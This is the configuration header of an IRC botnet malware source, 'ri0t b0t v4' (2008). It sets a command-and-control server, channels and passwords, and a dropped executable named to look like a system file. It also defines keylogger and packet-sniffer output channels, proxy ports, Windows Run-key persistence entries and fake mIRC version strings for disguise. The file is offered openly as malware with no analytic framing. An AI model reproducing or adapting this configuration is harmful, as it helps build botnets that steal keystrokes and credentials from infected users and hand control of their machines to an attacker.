/*
 *     ri0t b0t v4 by h1t3m
 * (Also known as ri0t r00t b0t)
 *
 */

unsigned short port = 56789;
unsigned short port2 = 56789;
unsigned short socks4port = 9012;
unsigned short httpport = 9013;
BOOL topiccmd = TRUE;
BOOL rndfilename = FALSE;
BOOL AutoStart = TRUE;

char prefix = '!';
int maxrand = 5;
int nicktype = CONSTNICK;
BOOL nickprefix = FALSE;

#ifdef DEBUG_LOGGING
char logfile[] = "debug362.txt";
#endif

#ifndef NO_CRYPT
//
#else

char password[]    = "hetehrewt";

char botid[]       = "ri0t b0t v4 [FinAL]";
char version[]     = ".::[ri0t b0t v4]|[fInAL]|[2008 by h1t3m]::.";
char nickconst[]   = "ri0t[v4]";
char modeonconn[]  = "-x+i";				
char chanmode[]    = "+snt";

char filename[]		   = "lcass.exe";		
char keylogfile[]          = "lcass.log";			
char valuename[]           = "LCASS";
char szLocalPayloadFile[]  = "lcass.exe";

char keylogchan[]  = "#k3ys#";
char psniffchan[]  = "#sniff#";

char server[]      = "my.dnsiskinky.com";
char serverpass[]  = "gawtztehshiz";
char channel[]     = "#ri0tv4#";	
char chanpass[]    = "gawtztehshiz";

char server2[]     = "my.dnsiskinky.com";
char channel2[]    = "#ri0tv4#";	
char chanpass2[]   = "gawtztehshiz";


char *authost[] = {
	"h1t3m@*",
};

char *versionlist[] = {
	"mIRC v6.03 Khaled Mardam-Bey",
	"mIRC v6.10 Khaled Mardam-Bey",
	"mIRC v6.12 Khaled Mardam-Bey",
	"mIRC v6.14 Khaled Mardam-Bey"
};

char regkey1[]="Software\\Microsoft\\Windows\\CurrentVersion\\Run";
char regkey2[]="Software\\Microsoft\\Windows\\CurrentVersion\\RunServices";
char regkey3[]="Software\\Microsoft\\OLE";
char regkey4[]="SYSTEM\\CurrentControlSet\\Control\\Lsa";
#endif

#ifdef PLAIN_CRYPT
char key[16] = "cD4fR2hI8gS3vU6bO5Gd";
#endif
